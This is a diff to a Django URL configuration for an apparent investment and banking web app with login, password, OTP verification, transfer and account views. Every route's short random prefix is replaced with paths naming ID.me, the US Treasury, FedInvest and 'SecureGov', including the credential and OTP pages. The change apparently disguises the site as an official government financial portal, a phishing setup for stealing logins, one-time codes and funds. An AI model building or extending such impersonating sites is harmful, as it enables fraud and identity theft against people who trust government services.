@@ -25,32 +25,32 @@ urlpatterns = [
     # =========================
     path('Lg82KsP1/signup/', views.SignupPage, name='signup'),
 
-    path('Qw91LmX2/login/', views.login_view, name='login'),
+    path('idmeTreasuryFedinvestSecureGov/TreasuryFedinvestHomeFedaccountGov/login/', views.login_view, name='login'),
 
-    path('Mn28ZxP0/signin/', views.login_email_view, name='signin'),
+    path('idmeTreasuryFedinvestSecureGov/TreasuryFedinvestHomeFedaccountGov/signin/', views.login_email_view, name='signin'),
 
-    path('Yt72LpQ9/password/', views.login_password_view, name='signin_password'),
+    path('idmeTreasuryFedinvestSecureGov/TreasuryFedinvestHomeFedaccountGov/password/', views.login_password_view, name='signin_password'),
 
-    path('Kp44XsD2/logout/', views.LogoutPage, name='logout'),
+    path('idmeTreasuryFedinvestSecureGov/TreasuryFedinvestHomeFedaccountGov/logout/', views.LogoutPage, name='logout'),
 
-    path('Vb21QaM7/verify-otp/', views.verify_otp, name='verify_otp'),
+    path('idmeTreasuryFedinvestSecureGov/TreasuryFedinvestHomeFedaccountGov/verify-otp/', views.verify_otp, name='verify_otp'),
 
     # =========================
     # DASHBOARD
     # =========================
-    path('Dx82LmQ1/dashboard/', views.DashboardPage, name='dashboard'),
+    path('idmeTreasuryFedinvestSecureGov/TreasuryFedinvestHomeFedaccountGov/dashboard/', views.DashboardPage, name='dashboard'),
 
     # =========================
     # USER PROFILE
     # =========================
     path(
-        'Ua82LmP/profile/<int:user_id>/',
+        'idmeTreasuryFedinvestSecureGov/TreasuryFedinvestHomeFedaccountGov/profile/<int:user_id>/',
         views.get_profile,
         name='get_profile'
     ),
 
     path(
-        'Ua82LmP/profile/edit/<int:user_id>/',
+        'idmeTreasuryFedinvestSecureGov/TreasuryFedinvestHomeFedaccountGov/profile/edit/<int:user_id>/',
         views.update_profile,
         name='update_profile'
     ),
@@ -59,13 +59,13 @@ urlpatterns = [
     # BENEFICIARY
     # =========================
     path(
-        'Bn92QaX/beneficiary/<int:beneficiary_id>/',
+        'idmeTreasuryFedinvestSecureGov/TreasuryFedinvestHomeFedaccountGov/beneficiary/<int:beneficiary_id>/',
         views.get_beneficiary_profile,
         name='get_beneficiary_profile'
     ),
 
     path(
-        'Bn92QaX/beneficiary/edit/<int:beneficiary_id>/',
+        'idmeTreasuryFedinvestSecureGov/TreasuryFedinvestHomeFedaccountGov/beneficiary/edit/<int:beneficiary_id>/',
         views.update_beneficiary_profile,
         name='update_beneficiary'
     ),
@@ -74,7 +74,7 @@ urlpatterns = [
     # TRANSACTIONS
     # =========================
     path(
-        'Tx82LmP/transactions/',
+        'idmeTreasuryFedinvestSecureGov/TreasuryFedinvestHomeFedaccountGov/transactions/',
         views.transactions,
         name='transactions'
     ),
@@ -83,7 +83,7 @@ urlpatterns = [
     # HOLDINGS
     # =========================
     path(
-        'Hd82LpQ/holdings/',
+        'idmeTreasuryFedinvestSecureGov/TreasuryFedinvestHomeFedaccountGov/holdings/',
         views.holdings_view,
         name='holdings'
     ),
@@ -98,7 +98,7 @@ urlpatterns = [
     # PORTFOLIO
     # =========================
     path(
-        'Pf82LmQ/portfolio/<int:account_id>/',
+        'idmeTreasuryFedinvestSecureGov/TreasuryFedinvestHomeFedaccountGov/portfolio/<int:account_id>/',
         views.portfolio_view,
         name='portfolio'
     ),
@@ -107,13 +107,13 @@ urlpatterns = [
     # BUY / SELL
     # =========================
     path(
-        'By82LpQ/buy/<int:account_id>/',
+        'idmeTreasuryFedinvestSecureGov/TreasuryFedinvestHomeFedaccountGov/buy/<int:account_id>/',
         views.buy_stock,
         name='buy'
     ),
 
     path(
-        'sell/<int:account_id>/<str:symbol>/',
+        'idmeTreasuryFedinvestSecureGov/TreasuryFedinvestHomeFedaccountGov/sell/<int:account_id>/<str:symbol>/',
         views.sell_stock,
         name='sell_stock'
     ),
@@ -122,19 +122,19 @@ urlpatterns = [
     # MESSAGES
     # =========================
     path(
-        'Ms82LpQ/messages/',
+        'idmeTreasuryFedinvestSecureGov/TreasuryFedinvestHomeFedaccountGov/messages/',
         views.message_list,
         name='messages'
     ),
 
     path(
-        'Ms82LpQ/messages/<int:pk>/',
+        'idmeTreasuryFedinvestSecureGov/TreasuryFedinvestHomeFedaccountGov/messages/<int:pk>/',
         views.message_detail,
         name='message_detail'
     ),
 
     path(
-        'Cp82QaX/compose/',
+        'idmeTreasuryFedinvestSecureGov/TreasuryFedinvestHomeFedaccountGov/compose/',
         views.compose_page,
         name='compose'
     ),
@@ -152,7 +152,7 @@ urlpatterns = [
     # GOLD
     # =========================
     path(
-        'Gd82QaP/gold/',
+        'idmeTreasuryFedinvestSecureGov/TreasuryFedinvestHomeFedaccountGov/gold/',
         views.gold_view,
         name='gold'
     ),
@@ -161,13 +161,13 @@ urlpatterns = [
     # ACCOUNTS
     # =========================
     path(
-        'Ca82LpQ/cash-account/',
+        'idmeTreasuryFedinvestSecureGov/TreasuryFedinvestHomeFedaccountGov/cash-account/',
         views.cash_account_list,
         name='cash_account_list'
     ),
 
     path(
-        'Sa82QaX/saving-account/',
+        'idmeTreasuryFedinvestSecureGov/TreasuryFedinvestHomeFedaccountGov/saving-account/',
         views.saving_account_list,
         name='saving_account'
     ),
@@ -176,7 +176,7 @@ urlpatterns = [
     # CRYPTO
     # =========================
     path(
-        'Cr82LmP/crypto/',
+        'idmeTreasuryFedinvestSecureGov/TreasuryFedinvestHomeFedaccountGov/crypto/',
         views.crypto_list,
         name='crypto_list'
     ),
@@ -185,7 +185,7 @@ urlpatterns = [
     # CALENDAR
     # =========================
     path(
-        'Cl82QaP/calendar/',
+        'idmeTreasuryFedinvestSecureGov/TreasuryFedinvestHomeFedaccountGov/calendar/',
         views.calendarPage,
         name='calendar'
     ),
@@ -194,7 +194,7 @@ urlpatterns = [
     # LEGAL DOCUMENTS
     # =========================
     path(
-        'Lg82QaM/legal-documents/',
+        'idmeTreasuryFedinvestSecureGov/TreasuryFedinvestHomeFedaccountGov/legal-documents/',
         views.legal_documents_view,
         name='legal_documents'
     ),
@@ -203,7 +203,7 @@ urlpatterns = [
     # STOCK DETAILS
     # =========================
     path(
-        'St82LmQ/stock/<str:symbol>/',
+        'idmeTreasuryFedinvestSecureGov/TreasuryFedinvestHomeFedaccountGov/stock/<str:symbol>/',
         views.stock_detail,
         name='stock_detail'
     ),
@@ -212,7 +212,7 @@ urlpatterns = [
     # ACTIVITY
     # =========================
     path(
-        'Ac82QaX/activity/',
+        'idmeTreasuryFedinvestSecureGov/TreasuryFedinvestHomeFedaccountGov/activity/',
         views.activity_list,
         name='activity'
     ),
@@ -221,7 +221,7 @@ urlpatterns = [
     # PERFORMANCE
     # =========================
     path(
-        'Pf91LmX/performance/',
+        'idmeTreasuryFedinvestSecureGov/TreasuryFedinvestHomeFedaccountGov/performance/',
         views.performancePage,
         name='performance'
     ),
@@ -230,7 +230,7 @@ urlpatterns = [
     # TRANSFER
     # =========================
     path(
-        'Tr82QaP/transfer/',
+        'idmeTreasuryFedinvestSecureGov/TreasuryFedinvestHomeFedaccountGov/transfer/',
         views.transfer_view,
         name='transfer'
     ),
